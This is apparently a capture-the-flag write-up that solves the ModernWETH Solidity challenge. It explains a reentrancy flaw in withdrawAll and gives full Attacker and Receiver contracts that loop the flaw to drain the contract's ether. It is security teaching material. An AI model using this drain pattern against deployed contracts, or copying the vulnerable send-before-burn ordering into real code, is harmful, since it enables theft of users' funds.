# ModernWETH

## Challenge

We are again only provided with one contract, which is an ERC-20:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title ModernWETH: The Insecure Modern Wrapped Ether
 */
contract ModernWETH is ERC20("Modern Insec Wrapped Ether", "mWETH"), ReentrancyGuard {
    
    /**
     * @notice Deposit ether to get wrapped ether
     */
    function deposit() public payable {
        _mint(msg.sender, msg.value);
    }

    /**
     * @notice Withdraw, burn wrapped ether to get ether
     */
    function withdraw(uint256 wad) external nonReentrant {
        (bool success,) = msg.sender.call{value: wad}("");
        require(success, "mWETH: ETH transfer failed");

        _burn(msg.sender, wad);
    }

    /**
     * @notice Withdraw, burn all wrapped ether to get all deposited ether
     */
    function withdrawAll() external nonReentrant {
        (bool success,) = msg.sender.call{value: balanceOf(msg.sender)}("");
        require(success, "mWETH: ETH transfer failed");

        _burnAll();
    }

    /**
     * @notice Burn all internal utility to burn all wrapped ether from the caller
     */
    function _burnAll() internal {
        _burn(msg.sender, balanceOf(msg.sender));
    }
}
```

Challenge Description:
In the ever-evolving world of decentralized finance, an ambitious developer took it upon himself to update the well-established WETH9. The result was ModernWETH, a modernized version of Solidity, that rapidly attracted deposits of over 1000 Ether.

However, we've encountered a challenge. Hidden within the code, a potential vulnerability threatens the security of the funds locked within the contract. This situation calls for the dedication and expertise of blockchain security auditors. Are you ready to step up, solve this issue, and play a crucial role in preserving the sanctity of the Ethereum ecosystem? This is the test of our resolve and adaptability, something I've seen in this community time and again.

📌 Starting with **10 ETH**, recover `1000 ETH` from the `ModernWETH` contract.

📌 Recover all `ETH` to avoid further losses from `ModernWETH` contract. Whitehat hacker should end up with **1010 ETH**.

## Solution

The problem here is classic cross-contract reentrancy in the withdrawAll() function. The problem is that we withdraw the money which leads to an outside call, and afterward all our tokens get burned. The issue is that nothing stops us to reenter through the transfer() function which is not protected by a reentrancy guard, and just transferring our tokens to another contract before they get burned. After the call, the function checks how many tokens we own, which are 0, and doesn't burn anything. But we still got our 10 ether out. You can see the issue in this code snippet that I  modified:

```solidity
function withdrawAll() external nonReentrant {
    //Now we still have 10 ETH worth of tokens which is the amount of ETH we get out
    (bool success,) = msg.sender.call{value: balanceOf(msg.sender)}("");
    //Now we own 0 tokens and nothing can be burnt
    
    require(success, "mWETH: ETH transfer failed");

    _burnAll();
}
```

The key part is to also have the contract you hold your tokens in during the burning process under your control, so you can return them afterward. I modified some Attakc contracts that I already had from SEETF2023 to cover both functionalities.

Attacker.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./ModernWETH.sol";
import "./Receiver.sol";

contract Attacker
{
    ModernWETH public weth;
    Receiver public receiver;
    address public owner;

    constructor(address _wethAddress) {
        weth = ModernWETH(payable(_wethAddress));
        owner = msg.sender;
        receiver = new Receiver(_wethAddress);
    }

    function attack() public payable {
        require(msg.value == 10 ether, "You need to send 10 ether to start the attack");

        //First we deposit our 10 eth
        weth.deposit{value: 10 ether}();

        //Now we abuse the bug 100 times to get all the money out of the contract.
        while(address(weth).balance > 0) {
            //Call the withdraw function
            weth.withdrawAll();

            //Call the giveMyMoneysBack function to get the tokens out of the receiver contract
            receiver.giveMyMoneysBack();
        }

        //Send all the profits to the owner
        owner.call{value: address(this).balance}("");
    }

    receive() external payable {
        //Move the tokens to our receiver contract to not burn them
        weth.transfer(address(receiver), 10 ether);
    }
}
```

Receiver.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./ModernWETH.sol";
import "./Receiver.sol";

contract Receiver
{
    ModernWETH public weth;
    address public attacker;

    constructor(address _wethAddress) {
        weth = ModernWETH(_wethAddress);
        attacker = msg.sender;
    }

    function giveMyMoneysBack() public {
        weth.transfer(attacker, weth.balanceOf(address(this)));
    }
}
```

Using the attack contract the challenge can be solved with 2 calls in the foundry test case:

```solidity
//Deploy the attacker contract
Attacker attacker = new Attacker(address(modernWETH));

//Call the attack function.
attacker.attack{value: 10 ether}();
```